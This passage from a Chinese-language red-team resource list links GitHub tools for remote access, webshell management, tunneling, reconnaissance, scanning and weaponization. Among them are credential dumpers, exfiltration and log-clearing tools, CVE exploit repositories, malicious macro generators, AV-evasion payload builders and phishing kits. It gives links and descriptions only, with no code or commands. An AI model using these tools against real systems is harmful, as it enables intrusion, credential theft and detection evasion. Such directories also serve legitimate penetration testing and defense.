<li><a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a> Pupy是一个开源、跨平台（Windows、Linux、OSX、Android）远程管理和后期开发工具，主要用 python 编写 ✨</li>
<li><a href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a>  Viper - metasploit-framework 图形化内网渗透工具 ✨</li>
<li><a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a>  “冰蝎”动态二进制加密网站管理客户端 ✨</li>
<li><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a>  Cknife 中国菜刀 ✨</li>
<li><a href="https://github.com/2Quico/antSword">https://github.com/2Quico/antSword</a>  中国蚁剑是一款跨平台的开源网站管理工具 ✨</li>
<li><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a>  Godzilla 哥斯拉 ✨</li>
<li><a href="https://github.com/0dayCTF/reverse-shell-generator">https://github.com/0dayCTF/reverse-shell-generator</a> 反弹shell生成器 ✨</li>
<li><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a>  frp 专注于内网穿透的高性能的反向代理应用 ✨</li>
<li><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a>  nps 轻量级、高性能、功能强大的内网穿透代理服务器 ✨</li>
<li><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a>  Neo-reGeorg 改进的reGeorg版本 ✨</li>
<li><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a>  dnscat2 是一个DNS隧道工具 ✨</li>
<li><a href="https://github.com/ntop/n2n">https://github.com/ntop/n2n</a>  n2n 开源的点对点穿透工具 ✨</li>
<li><a href="https://github.com/inconshreveable/ngrok">https://github.com/inconshreveable/ngrok</a>  ngrok 正&#x2F;反向代理，内网穿透，端口转发 ✨</li>
<li><a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a>  goproxy 一款轻量级、功能强大、高性能的多种代理工具 ✨</li>
<li><a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a> Merlin是一个用 golang 编写的跨平台后开发 HTTP&#x2F;2 命令和控制服务器和代理 ✨</li>
<li><a href="https://github.com/Marten4n6/EvilOSX">https://github.com/Marten4n6/EvilOSX</a> EvilOSX适用于 macOS &#x2F; OS X 的邪恶 RAT（远程管理工具）✨</li>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a> CrackMapExec是用于渗透测试网络的瑞士军刀 ✨</li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> PowerSploit是 Microsoft PowerShell 模块的集合，可用于在评估的所有阶段为渗透测试人员提供帮助 ✨</li>
<li><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> Nishang是一个脚本和有效载荷的框架和集合，它支持使用 PowerShell 进行攻击性安全、渗透测试和红队 ✨</li>
<li><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a> Mimikatz是一个开源实用程序，可用于查看来自 Windows lsass 的凭据信息 ✨</li>
<li><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a> LaZagne项目是一个跨平台开源应用程序，用于检索存储在本地计算机上的大量密码 ✨</li>
<li><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a> mimipenguin是一个转储当前 linux 桌面用户的登录密码的工具 ✨</li>
<li><a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a> CloakifyFactory和 Cloakify 工具集 - 数据渗透和渗透；规避 DLP&#x2F;MLS 设备；分析师的社会工程学；击败数据白名单控制；逃避 AV 检测 ✨</li>
<li><a href="https://github.com/ytisf/PyExfil">https://github.com/ytisf/PyExfil</a> PyExfil一个用于数据泄露的 Python 包 ✨</li>
<li><a href="https://github.com/Rizer0/Log-killer">https://github.com/Rizer0/Log-killer</a> linux&#x2F;windows日志清除 ✨</li>
<li><a href="https://github.com/LasCC/Hack-Tools">https://github.com/LasCC/Hack-Tools</a>  Hack-Tools 适用于红队的浏览器扩展插件 ✨</li>
<li><a href="https://github.com/FelisCatus/SwitchyOmega">https://github.com/FelisCatus/SwitchyOmega</a>  SwitchyOmega 浏览器的代理插件 ✨</li>
<li><a href="https://github.com/outflanknl/RedELK/">https://github.com/outflanknl/RedELK/</a> RedELK Red Team 的 SIEM - 易于部署的 Red Team 工具，用于跟踪和警告 Blue Team 活动以及更好的长期运营可用性 ✨</li>
<li><a href="https://github.com/redcanaryco/atomic-red-team">https://github.com/redcanaryco/atomic-red-team</a> Atomic Red Team - 映射到 Miter ATT&amp;CK 框架的小型且高度便携的检测测试 ✨</li>
</ul>
<h2 id="0x01目标侦查"><a href="#0x01目标侦查" class="headerlink" title="0x01	目标侦查"></a>0x01	目标侦查</h2><h3 id="侦查框架"><a href="#侦查框架" class="headerlink" title="侦查框架"></a>侦查框架</h3><ul>
<li><a href="https://www.paterva.com/web7/downloads.php">https://www.paterva.com/web7/downloads.php</a> Maltego是一个独特的平台，旨在向组织拥有和运营的环境提供清晰的威胁图片 ✨</li>
<li><a href="https://github.com/smicallef/spiderfoot">https://github.com/smicallef/spiderfoot</a> SpiderFoot是开源足迹和情报收集工具 ✨</li>
<li><a href="https://github.com/DataSploit/datasploit">https://github.com/DataSploit/datasploit</a> datasploit是一个 OSINT 框架，用于对公司、人员、电话号码、比特币地址等执行各种侦察技术，聚合所有原始数据，并以多种格式提供数据 ✨</li>
<li><a href="https://github.com/lanmaster53/recon-ng">https://github.com/lanmaster53/recon-ng</a> Recon-ng是一个用 Python 编写的全功能 Web 侦察框架 ✨</li>
<li><a href="https://github.com/zsdevX/DarkEye">https://github.com/zsdevX/DarkEye</a>  DarkEye 渗透测试情报收集工具</li>
<li><a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a>  AppInfoScanner 适用于红队的移动端(Android、iOS、WEB、H5、静态网站)信息收集工具</li>
</ul>
<h3 id="1-域名信息"><a href="#1-域名信息" class="headerlink" title="1. 域名信息"></a>1. 域名信息</h3><h4 id="a-Whois信息"><a href="#a-Whois信息" class="headerlink" title="a. Whois信息"></a>a. Whois信息</h4><ul>
<li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>  微步</li>
<li><a href="https://who.is/">https://who.is/</a>  国外的whois信息查询</li>
<li><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> 站长之家</li>
<li><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a>  爱站</li>
</ul>
<h4 id="b-子域名发现"><a href="#b-子域名发现" class="headerlink" title="b. 子域名发现"></a>b. 子域名发现</h4><ul>
<li><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a> subDomainBrute是通过DNS爆破来找到子域名</li>
<li><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a> Sublist3r在暴力破解的基础上，通过接口枚举来获取域名 ✨</li>
<li><a href="https://github.com/FeeiCN/ESD">https://github.com/FeeiCN/ESD</a> ESD支持泛解析域名，速度快，字典全，收集渠道丰富</li>
<li><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a> OneForAll支持被动搜索域名，子域爆破，子域接管，端口探测，指纹识别等 ✨</li>
<li><a href="https://github.com/projectdiscovery/dnsprobe">https://github.com/projectdiscovery/dnsprobe</a> dnsprobe是go语言编写的dns查询工具，边读边爆破</li>
<li><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a> subfinder通过各种接口来发现有效子域名 ✨</li>
<li><a href="https://github.com/blechschmidt/massdns">https://github.com/blechschmidt/massdns</a> Massdn 是一个简单的高性能 DNS 存根解析器</li>
<li><a href="https://github.com/yunxu1/dnsub">https://github.com/yunxu1/dnsub</a>  dnsub一款好用的子域名扫描工具</li>
</ul>
<h4 id="c-域名侦查"><a href="#c-域名侦查" class="headerlink" title="c. 域名侦查"></a>c. 域名侦查</h4><ul>
<li><a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a> AQUATONE是一套用于对域名进行侦察的工具</li>
<li><a href="https://github.com/BishopFox/spoofcheck">https://github.com/BishopFox/spoofcheck</a> spoofcheck一个检查域是否可以被欺骗的程序</li>
<li><a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a> dnsrecon一个工具 DNS 枚举脚本 ✨</li>
</ul>
<h4 id="d-备案信息"><a href="#d-备案信息" class="headerlink" title="d. 备案信息"></a>d. 备案信息</h4><ul>
<li><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a>  天眼查</li>
<li><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a>  ICP备案查询网</li>
<li><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> 国家企业信用信息公示系统</li>
</ul>
<h4 id="e-CDN验证"><a href="#e-CDN验证" class="headerlink" title="e. CDN验证"></a>e. CDN验证</h4><ul>
<li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> 多地ping ✨</li>
</ul>
<h3 id="2-IP发现"><a href="#2-IP发现" class="headerlink" title="2. IP发现"></a>2. IP发现</h3><ul>
<li><a href="https://github.com/ChrisTruncer/Just-Metadata">https://github.com/ChrisTruncer/Just-Metadata</a> Just-Metadata是一种收集和分析有关 IP 地址的元数据的工具</li>
<li><a href="https://github.com/nccgroup/typofinder">https://github.com/nccgroup/typofinder</a> Typfinder显示 IP 地址国家&#x2F;地区的域拼写错误查找器</li>
<li><a href="http://toolbar.netcraft.com/">http://toolbar.netcraft.com/</a> 查询域名历史ip</li>
<li><a href="http://www.webscan.cc/">http://www.webscan.cc/</a> C段主机探测</li>
</ul>
<h3 id="3-互联网信息收集"><a href="#3-互联网信息收集" class="headerlink" title="3. 互联网信息收集"></a>3. 互联网信息收集</h3><h4 id="a-Google-Hacking"><a href="#a-Google-Hacking" class="headerlink" title="a. Google Hacking"></a>a. Google Hacking</h4><ul>
<li><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></li>
<li><a href="https://github.com/m3n0sd0n4ld/uDork">https://github.com/m3n0sd0n4ld/uDork</a></li>
<li><a href="https://github.com/opsdisk/pagodo">https://github.com/opsdisk/pagodo</a> ✨</li>
</ul>
<h4 id="b-资产测绘"><a href="#b-资产测绘" class="headerlink" title="b. 资产测绘"></a>b. 资产测绘</h4><ul>
<li><a href="https://github.com/atdpa4sw0rd/Search-Tools">https://github.com/atdpa4sw0rd/Search-Tools</a></li>
<li><a href="https://www.shodan.io/">https://www.shodan.io/</a></li>
<li><a href="https://censys.io/">https://censys.io/</a></li>
<li><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a> ✨</li>
<li><a href="https://fofa.so/">https://fofa.so/</a>  ✨</li>
<li><a href="https://cn.gobies.org/">https://cn.gobies.org/</a></li>
<li><a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a>  Kscan - 简单好用的资产测绘工具</li>
</ul>
<h4 id="c-Github"><a href="#c-Github" class="headerlink" title="c. Github"></a>c. Github</h4><ul>
<li><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a> GitHarvester该工具用于从 GitHub 中收集信息，例如 google dork</li>
<li><a href="https://github.com/obheda12/GitDorker">https://github.com/obheda12/GitDorker</a>  GitDorker Python程序，使用Github dorks从Github搜索敏感信息 ✨</li>
<li><a href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a> Github敏感信息监控 ✨</li>
<li><a href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a></li>
<li><a href="https://github.com/hisxo/gitGraber">https://github.com/hisxo/gitGraber</a> Github敏感数据搜索</li>
</ul>
<h4 id="d-邮箱"><a href="#d-邮箱" class="headerlink" title="d. 邮箱"></a>d. 邮箱</h4><ul>
<li><a href="https://github.com/killswitch-GUI/SimplyEmail">https://github.com/killswitch-GUI/SimplyEmail</a> SimplyEmail电子邮件侦查变得快速而简单，并有一个可构建的框架 ✨</li>
<li><a href="https://github.com/thewhiteh4t/pwnedOrNot">https://github.com/thewhiteh4t/pwnedOrNot</a> pwnedOrNot是一个 Python 脚本，用于检查电子邮件帐户是否因数据泄露而被盗用，如果电子邮件帐户被盗用，它将继续查找被盗用帐户的密码</li>
</ul>
<h4 id="e-网盘搜索"><a href="#e-网盘搜索" class="headerlink" title="e. 网盘搜索"></a>e. 网盘搜索</h4><ul>
<li><a href="http://www.panduoduo.top/">http://www.panduoduo.top/</a> 盘多多</li>
<li><a href="https://www.chongbuluo.com/">https://www.chongbuluo.com/</a> 虫部落</li>
</ul>
<h4 id="f-云服务信息"><a href="#f-云服务信息" class="headerlink" title="f. 云服务信息"></a>f. 云服务信息</h4><ul>
<li><a href="https://github.com/bbb31/slurp">https://github.com/bbb31/slurp</a></li>
<li><a href="https://github.com/jordanpotti/CloudScraper">https://github.com/jordanpotti/CloudScraper</a> ✨</li>
</ul>
<h3 id="4-服务器信息收集"><a href="#4-服务器信息收集" class="headerlink" title="4. 服务器信息收集"></a>4. 服务器信息收集</h3><h4 id="a-端口扫描"><a href="#a-端口扫描" class="headerlink" title="a. 端口扫描"></a>a. 端口扫描</h4><ul>
<li><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a> ✨</li>
<li><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></li>
<li><a href="https://github.com/zmap/zgrab2">https://github.com/zmap/zgrab2</a> Go版端口扫描器 ✨</li>
<li><a href="https://github.com/RustScan/RustScan">https://github.com/RustScan/RustScan</a> Rust版端口扫描器 ✨</li>
<li><a href="https://github.com/awake1t/PortBrute">https://github.com/awake1t/PortBrute</a>  PortBrute 一款跨平台小巧的端口爆破工具</li>
</ul>
<h3 id="5-网站信息收集"><a href="#5-网站信息收集" class="headerlink" title="5. 网站信息收集"></a>5. 网站信息收集</h3><h4 id="a-指纹识别"><a href="#a-指纹识别" class="headerlink" title="a. 指纹识别"></a>a. 指纹识别</h4><ul>
<li><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a> 云悉</li>
<li><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a>  whatweb工具</li>
<li><a href="https://github.com/AliasIO/Wappalyzer">https://github.com/AliasIO/Wappalyzer</a> ✨</li>
<li><a href="https://github.com/n4xh4ck5/CMSsc4n">https://github.com/n4xh4ck5/CMSsc4n</a> CMS指纹识别</li>
<li><a href="https://github.com/salesforce/ja3">https://github.com/salesforce/ja3</a> </li>
<li><a href="https://github.com/fingerprintjs/fingerprintjs">https://github.com/fingerprintjs/fingerprintjs</a> 浏览器指纹识别 ✨</li>
</ul>
<h4 id="b-网络目录扫描"><a href="#b-网络目录扫描" class="headerlink" title="b. 网络目录扫描"></a>b. 网络目录扫描</h4><ul>
<li><a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a>  御剑目录扫描 ✨</li>
<li><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>  dirsearch - Web path scanner 目录扫描工具 ✨</li>
<li><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></li>
<li><a href="https://github.com/Xyntax/DirBrute">https://github.com/Xyntax/DirBrute</a></li>
<li><a href="https://github.com/0Kee-Team/crawlergo">https://github.com/0Kee-Team/crawlergo</a> 路径爬虫 ✨</li>
</ul>
<h4 id="c-WAF识别"><a href="#c-WAF识别" class="headerlink" title="c. WAF识别"></a>c. WAF识别</h4><ul>
<li><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a> ✨</li>
<li><a href="https://github.com/Ekultek/WhatWaf">https://github.com/Ekultek/WhatWaf</a> ✨</li>
</ul>
<h3 id="6-敏感信息"><a href="#6-敏感信息" class="headerlink" title="6. 敏感信息"></a>6. 敏感信息</h3><h4 id="a-Git-x2F-SVN源码泄露"><a href="#a-Git-x2F-SVN源码泄露" class="headerlink" title="a. Git&#x2F;SVN源码泄露"></a>a. Git&#x2F;SVN源码泄露</h4><ul>
<li><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a> truffleHog在 git 存储库中搜索秘密，深入挖掘提交历史和分支 ✨</li>
<li><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li>
</ul>
<h4 id="b-文档元数据"><a href="#b-文档元数据" class="headerlink" title="b. 文档元数据"></a>b. 文档元数据</h4><ul>
<li><a href="https://github.com/laramies/metagoofil">https://github.com/laramies/metagoofil</a> Metagoofil是一种用于提取目标网站中可用公共文档（pdf、doc、xls、ppt 等）元数据的工具</li>
</ul>
<h4 id="c-CI信息泄露"><a href="#c-CI信息泄露" class="headerlink" title="c. CI信息泄露"></a>c. CI信息泄露</h4><ul>
<li><a href="https://github.com/lc/secretz">https://github.com/lc/secretz</a></li>
</ul>
<h4 id="d-密码信息"><a href="#d-密码信息" class="headerlink" title="d. 密码信息"></a>d. 密码信息</h4><ul>
<li><a href="https://github.com/berzerk0/Probable-Wordlists">https://github.com/berzerk0/Probable-Wordlists</a> ✨</li>
<li><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a> ✨</li>
<li><a href="https://github.com/x899/chrome_password_grabber">https://github.com/x899/chrome_password_grabber</a></li>
<li><a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a> ✨</li>
</ul>
<h3 id="6-社交信息"><a href="#6-社交信息" class="headerlink" title="6. 社交信息"></a>6. 社交信息</h3><ul>
<li><a href="https://github.com/SpiderLabs/social_mapper">https://github.com/SpiderLabs/social_mapper</a> Social Mapper OSINT 社交媒体映射工具，获取姓名和图像（或 LinkedIn 公司名称）列表，并在多个社交媒体网站上大规模执行自动目标搜索 ✨</li>
<li><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a> theHarvester是一种用于从不同公共来源收集子域名、电子邮件地址、虚拟主机、开放端口&#x2F;横幅和员工姓名的工具 ✨</li>
<li><a href="https://github.com/vysecurity/LinkedInt">https://github.com/vysecurity/LinkedInt</a> LinkedInt LinkedIn Recon 工具</li>
<li><a href="https://github.com/m8r0wn/CrossLinked">https://github.com/m8r0wn/CrossLinked</a> CrossLinked LinkedIn 枚举工具，通过搜索引擎抓取从组织中提取有效员工姓名</li>
</ul>
<h2 id="0x02渗透攻击"><a href="#0x02渗透攻击" class="headerlink" title="0x02	渗透攻击"></a>0x02	渗透攻击</h2><h3 id="1-漏洞挖掘"><a href="#1-漏洞挖掘" class="headerlink" title="1. 漏洞挖掘"></a>1. 漏洞挖掘</h3><h4 id="1-web应用扫描器"><a href="#1-web应用扫描器" class="headerlink" title="1. web应用扫描器"></a>1. web应用扫描器</h4><ul>
<li><a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a>  一款功能强大的安全评估工具 - Xray ✨ </li>
<li><a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a>  Vulmap 是一款 web 漏洞扫描和验证工具 ✨</li>
<li><a href="https://github.com/w-digital-scanner/w9scan">https://github.com/w-digital-scanner/w9scan</a>  w9scan 一款全能型的网站漏洞扫描器 ✨</li>
<li><a href="https://github.com/HXSecurity/DongTaiDoc">https://github.com/HXSecurity/DongTaiDoc</a>  DongTaiDoc 灵芝IAST是一款交互式应用安全评估工具</li>
</ul>
<h4 id="b-系统服务扫描器"><a href="#b-系统服务扫描器" class="headerlink" title="b. 系统服务扫描器"></a>b. 系统服务扫描器</h4><ul>
<li><a href="https://github.com/gobysec/Goby">https://github.com/gobysec/Goby</a>  网络安全测试工具 - Goby</li>
<li><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a>  巡风是一款适用于企业内网的漏洞快速应急、巡航扫描系统 ✨</li>
<li><a href="https://github.com/WyAtu/Perun">https://github.com/WyAtu/Perun</a>  Perun 网络资产漏洞扫描器&#x2F;扫描框架 ✨</li>
<li><a href="https://github.com/awake1t/linglong">https://github.com/awake1t/linglong</a>  linglong 一款甲方资产巡航扫描系统。系统定位是发现资产，进行端口爆破 ✨</li>
</ul>
<h4 id="c-通用漏洞扫描器"><a href="#c-通用漏洞扫描器" class="headerlink" title="c. 通用漏洞扫描器"></a>c. 通用漏洞扫描器</h4><ul>
<li><a href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a>  pocsuite3 开源的远程漏洞测试框架 ✨</li>
<li><a href="https://github.com/amcai/myscan">https://github.com/amcai/myscan</a>  Myscan 被动扫描器</li>
<li><a href="https://github.com/lz520520/railgun">https://github.com/lz520520/railgun</a>  Railgun是一款GUI界面的渗透工具，综合类的扫描工具</li>
<li><a href="https://github.com/opensec-cn/kunpeng">https://github.com/opensec-cn/kunpeng</a>  kunpeng是一个Golang编写的开源POC框架&#x2F;库 ✨</li>
<li><a href="https://github.com/DSO-Lab/pocscan">https://github.com/DSO-Lab/pocscan</a>  pocscan PoC扫描器 主要用于指纹识别后，进行漏洞精准扫描</li>
<li><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a>  Ladon一款用于大型网络渗透的多线程插件化综合扫描神器 ✨</li>
<li><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a>  fscan 一款内网扫描工具，方便一键 ✨</li>
<li><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a>  POC-T 渗透测试插件化并发框架 ✨</li>
<li><a href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a>  SNETCracker 超级弱口令检查工具</li>
<li><a href="https://github.com/Acmesec/PoCBox">https://github.com/Acmesec/PoCBox</a>  PoCBox - 漏洞测试验证辅助平台</li>
</ul>
<h3 id="2-武器化"><a href="#2-武器化" class="headerlink" title="2. 武器化"></a>2. 武器化</h3><ul>
<li><a href="https://github.com/WyAtu/CVE-2018-20250">https://github.com/WyAtu/CVE-2018-20250</a> 针对 CVE-2018-20250 的WinRAR 远程代码执行概念漏洞利用证明</li>
<li><a href="https://github.com/rxwx/CVE-2017-8570">https://github.com/rxwx/CVE-2017-8570</a> 针对 CVE-2017-8570 的复合名称概念验证漏洞利用</li>
<li><a href="https://github.com/bhdresh/CVE-2017-8759">https://github.com/bhdresh/CVE-2017-8759</a> 漏洞利用工具包 CVE-2017-8759是一个方便的 Python 脚本，它为渗透测试人员和安全研究人员提供了一种快速有效的方法来测试 Microsoft .NET Framework RCE</li>
<li><a href="https://github.com/unamer/CVE-2017-11882">https://github.com/unamer/CVE-2017-11882</a> CVE-2017-11882 Exploit 最多接受超过 17k 字节长的命令&#x2F;代码</li>
<li><a href="https://github.com/anbai-inc/CVE-2018-4878">https://github.com/anbai-inc/CVE-2018-4878</a> Adobe Flash 漏洞利用CVE-2018-4878</li>
<li><a href="https://github.com/bhdresh/CVE-2017-0199">https://github.com/bhdresh/CVE-2017-0199</a> 漏洞利用工具包 CVE-2017-0199是一个方便的 Python 脚本，它为渗透测试人员和安全研究人员提供了一种快速有效的方法来测试 Microsoft Office RCE</li>
<li><a href="https://github.com/nccgroup/demiguise">https://github.com/nccgroup/demiguise</a> demiguise是RedTeams的 HTA 加密工具</li>
<li><a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a> Office-DDE-Payloads脚本和模板集合，用于生成嵌入了 DDE、无宏命令执行技术的 Office 文档</li>
<li><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a> 用于对手模拟的CACTUSTORCH有效载荷生成</li>
<li><a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a> SharpShooter是一个有效载荷创建框架，用于检索和执行任意 CSharp 源代码</li>
<li><a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a> Don’t kill my cat是一种工具，可以生成存储在多语言图像中的混淆 shellcode</li>
<li><a href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a> 恶意宏生成器实用程序简单的实用程序设计可生成混淆的宏，其中还包括 AV &#x2F; 沙盒逃逸机制</li>
<li><a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a> SCT 混淆器Cobalt Strike SCT 有效载荷混淆器</li>
<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a> 调用混淆PowerShell 混淆器</li>
<li><a href="https://github.com/danielbohannon/Invoke-CradleCrafter">https://github.com/danielbohannon/Invoke-CradleCrafter</a> Invoke-CradleCrafter PowerShell 远程下载摇篮生成器和混淆器</li>
<li><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a> Invoke-DOSfuscation cmd.exe 命令混淆生成器和检测测试工具</li>
<li><a href="https://github.com/vysec/morphHTA">https://github.com/vysec/morphHTA</a> morphHTA变形 Cobalt Strike 的 evil.HTA</li>
<li><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a> Unicorn是一个简单的工具，用于使用 PowerShell 降级攻击并将 shellcode 直接注入内存 ✨</li>
<li><a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a> Shellter是一个动态 shellcode 注入工具，也是有史以来第一个真正的动态 PE 感染器 ✨</li>
<li><a href="https://github.com/Arno0x/EmbedInHTML">https://github.com/Arno0x/EmbedInHTML</a> EmbedInHTML在 HTML 文件中嵌入和隐藏任何文件</li>
<li><a href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a> SigThief窃取签名并一次制作一个无效签名</li>
<li><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a> Veil是一种工具，旨在生成绕过常见反病毒解决方案的 metasploit 有效载荷 ✨</li>
<li><a href="https://github.com/Arvanaghi/CheckPlease">https://github.com/Arvanaghi/CheckPlease</a> CheckPlease沙盒规避模块使用 PowerShell、Python、Go、Ruby、C、C#、Perl 和 Rust 编写</li>
<li><a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a> Invoke-PSImage是一种将 PowerShell 脚本嵌入到 PNG 文件的像素中并生成要执行的 oneliner 的工具</li>
<li><a href="https://github.com/curi0usJack/luckystrike">https://github.com/curi0usJack/luckystrike</a> LuckyStrike基于 PowerShell 的实用程序，用于创建恶意 Office 宏文档</li>
<li><a href="https://github.com/Mr-Un1k0d3r/ClickOnceGenerator">https://github.com/Mr-Un1k0d3r/ClickOnceGenerator</a> ClickOnceGenerator红队快速恶意 ClickOnceGenerator</li>
<li><a href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a> macro_pack是@EmericNasi的一个工具，用于自动混淆和生成 MS Office 文档、VB 脚本和其他格式，用于渗透测试、演示和社会工程评估 ✨</li>
<li><a href="https://github.com/Cn33liz/StarFighters">https://github.com/Cn33liz/StarFighters</a> StarFighters基于 JavaScript 和 VBScript 的 Empire Launcher</li>
<li><a href="https://github.com/trustedsec/nps_payload">https://github.com/trustedsec/nps_payload</a> nps_payload此脚本将为基本的入侵检测避免生成有效负载</li>
<li><a href="https://github.com/bhdresh/SocialEngineeringPayloads">https://github.com/bhdresh/SocialEngineeringPayloads</a> SocialEngineeringPayloads用于凭据盗窃和鱼叉式网络钓鱼攻击的社会工程技巧和有效载荷的集合</li>
<li><a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a> Social-Engineer Toolkit是一个为社会工程设计的开源渗透测试框架 ✨</li>
<li><a href="https://github.com/ryhanson/phishery">https://github.com/ryhanson/phishery</a> Phishery是一个启用 SSL 的简单 HTTP 服务器，其主要目的是通过基本身份验证钓鱼凭据</li>
<li><a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a> PowerShdll使用 rundll32 运行 PowerShell</li>
<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">https://github.com/api0cradle/UltimateAppLockerByPassList</a> 终极 AppLocker绕过列表此存储库的目标是记录绕过 AppLocker 的最常见技术</li>
<li><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a> Ruler是一种工具，允许您通过 MAPI&#x2F;HTTP 或 RPC&#x2F;HTTP 协议与 Exchange 服务器进行远程交互 ✨</li>
<li><a href="https://github.com/enigma0x3/Generate-Macro">https://github.com/enigma0x3/Generate-Macro</a> Generate-Macro是一个独立的 PowerShell 脚本，它将生成具有指定负载和持久性方法的恶意 Microsoft Office 文档</li>
<li><a href="https://github.com/infosecn1nja/MaliciousMacroMSBuild">https://github.com/infosecn1nja/MaliciousMacroMSBuild</a> 恶意宏 MSBuild 生成器生成恶意宏并通过 MSBuild 应用程序白名单绕过来执行 Powershell 或 Shellcode</li>
<li><a href="https://github.com/threatexpress/metatwin">https://github.com/threatexpress/metatwin</a> Meta Twin被设计为文件资源克隆器</li>
<li><a href="https://github.com/mwrlabs/wePWNise">https://github.com/mwrlabs/wePWNise</a> WePWNise生成要在 Office 文档或模板中使用的与架构无关的 VBA 代码，并自动绕过应用程序控制和漏洞利用缓解软件</li>
<li><a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a> DotNetToJScript一种用于创建 JScript 文件的工具，该文件从内存加载 .NET v2 程序集</li>
